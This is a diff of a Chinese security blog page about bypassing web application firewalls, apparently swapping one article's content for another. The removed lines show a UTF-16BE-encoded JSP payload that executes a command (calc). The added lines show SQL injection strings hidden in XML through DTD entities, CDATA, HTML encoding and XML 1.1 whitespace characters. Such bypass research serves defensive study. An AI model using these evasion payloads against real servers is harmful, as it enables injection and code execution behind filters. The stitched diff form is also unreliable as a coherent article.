-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:directive.page pageEncoding&#x3D;&quot;utf-16be&quot;&#x2F;&gt;%00%3C%00%25%00%20%00o%00u%00t%00.%00w%00r%00i%00t%00e%00%28%00%22%00I%00%27%00m%00%20%00t%00u%00r%00n%001%00t%00u%00p%00%21%00%22%00%29%00%3B%00%20%00o%00u%00t%00.%00p%00r%00i%00n%00t%00%28%00R%00u%00n%00t%00i%00m%00e%00.%00g%00e%00t%00R%00u%00n%00t%00i%00m%00e%00%28%00%29%00.%00e%00x%00e%00c%00%28%00%22%00c%00a%00l%00c%00%22%00%29%00%29%00%3B%00%20%00%25%00%3E</span><br></pre></td></tr></table></figure>
+<h2 id="3-2-local-entity"><a href="#3-2-local-entity" class="headerlink" title="3.2 local entity"></a>3.2 local entity</h2><p>通过在DTD中定义本地实体，可在标签属性值、标签内容、DTD字符串值，这些字符串区域引用。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>" union select 1 -- -<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>使用本地实体：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">test1</span> <span class="meta-string">"select"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">test2</span> <span class="meta-string">"union"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>" &amp;test2; &amp;test1; 1 -- -<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 
-<p>标签的位置也可以变化：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%00%3C%00%25%00%20%00o%00u%00t%00.%00w%00r%00i%00t%00e%00%28%00%22%00I%00%27%00m%00%20%00t%00u%00r%00n%001%00t%00u%00p%00%21%00%22%00%29%00%3B%00%20%00o%00u%00t%00.%00p%00r%00i%00n%00t%00%28%00R%00u%00n%00t%00i%00m%00e%00.%00g%00e%00t%00R%00u%00n%00t%00i%00m%00e%00%28%00%29%00.%00e%00x%00e%00c%00%28%00%22%00c%00a%00l%00c%00%22%00%29%00%29%00%3B%00%20%00%25%00%3E&lt;%@ page contentType&#x3D;&quot;charset&#x3D;utf-16be&quot;</span><br></pre></td></tr></table></figure>
+<p>使用HTML编码、CDATA也可以：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">test1</span> <span class="meta-string">"&lt;![CDATA[el]]&gt;ect"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">test2</span> <span class="meta-string">"&amp;#x75;&amp;#x6e;&amp;#x69;&amp;#x6f;&amp;#x6e;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>" &amp;test2; &amp;test1; 1 -- -<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<h1 id="3-结语"><a href="#3-结语" class="headerlink" title="3 结语"></a>3 结语</h1><p>好吧，还是有点意思。</p>
+<h1 id="4-XML1-1"><a href="#4-XML1-1" class="headerlink" title="4. XML1.1"></a>4. XML1.1</h1><h2 id="4-1-space-char"><a href="#4-1-space-char" class="headerlink" title="4.1 space char"></a>4.1 space char</h2><p>当XML版本被声明为1.1时，XML的解析将支持一些额外的空白字符、控制字符。</p>
+<p>jdk1.8.0_191\src.zip!\com\sun\org\apache\xerces\internal\impl\XML11EntityScanner.java：</p>
+<p><img src="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/xml11_space_char.png" alt></p>
+<p>jdk1.8.0_191\src.zip!\com\sun\org\apache\xerces\internal\parsers\XML11Configuration.java：</p>
+<p><img src="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/xml11Configuration.png" alt></p>
+<p>代码中的\x85是指码点，而非我们平时所见的unicdoe字符。而\x85二进制为‭10000101‬，高位为1，根据笔者认知，UTF-8无法使得8比特码点成为UTF-8字符，因此我们无法在UTF-8中使用它，但在ISO-8859-1、UTF-16等字符集中我们可以使用它：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.1" encoding="iso-8859-1"?&gt;</span>%85<span class="tag">&lt;<span class="name">root%85</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">root%85</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在UTF-16BE中对应的unicode字符为\x00\x85：</p>
+<p>同样的，\x28\x20是指码点，其UTF-8编码字符为%E2%80%A8，推导过程如下：</p>
+<p>\x20 \x28转2进制比特：<br>00100000 00101000<br>UTF-8中三个字节的编码规范：<br>1110XXXX 10XXXXXX 10XXXXXX<br>\x20\x28转UTF-8的2进制比特：<br>11100010 10000000 10101000<br>\x20\x28的UTF-8编码为:<br>%E2%80%A8</p>
+<p>于是我们可以对XML文档进行如下修改：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.1" encoding="utf-8"?&gt;</span>%E2%80%A8<span class="tag">&lt;<span class="name">root%E2%80%A8</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">root%E2%80%A8</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>由于底层代码逻辑多，起初还想边看边画一些要点的逻辑流程，但是这样太慢了，前期收益太低。现在看来，这样会导致无法详尽逻辑点，也让后期的再次整理与回顾变得艰难，另外笔者看代码时也遗漏了一些绕过方式，如PI分割字符串。常见的XML服务器，除开JAVA外，还有.NET、PHP，而作为XML的子集SOAP，不知SOAP自身是否还有其他骚操作，这样想来，本文总结的绕过手法也未必详尽。</p>
 
       
 
@@ -253,7 +255,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/">展开全文 >></a>
+          <a class="article-more-a" href="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/">展开全文 >></a>
         </p>
       
 
@@ -285,7 +287,7 @@
   
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/15/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="page-number" href="/page/15/">15</a><span class="page-number current">16</span><a class="page-number" href="/page/17/">17</a><a class="page-number" href="/page/18/">18</a><span class="space">&hellip;</span><a class="page-number" href="/page/23/">23</a><a class="extend next" rel="next" href="/page/17/">Next &amp;raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/15/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="page-number" href="/page/15/">15</a><span class="page-number current">16</span><a class="page-number" href="/page/17/">17</a><a class="page-number" href="/page/18/">18</a><span class="space">&hellip;</span><a class="page-number" href="/page/22/">22</a><a class="extend next" rel="next" href="/page/17/">Next &amp;raquo;</a>
     </nav>
   
 
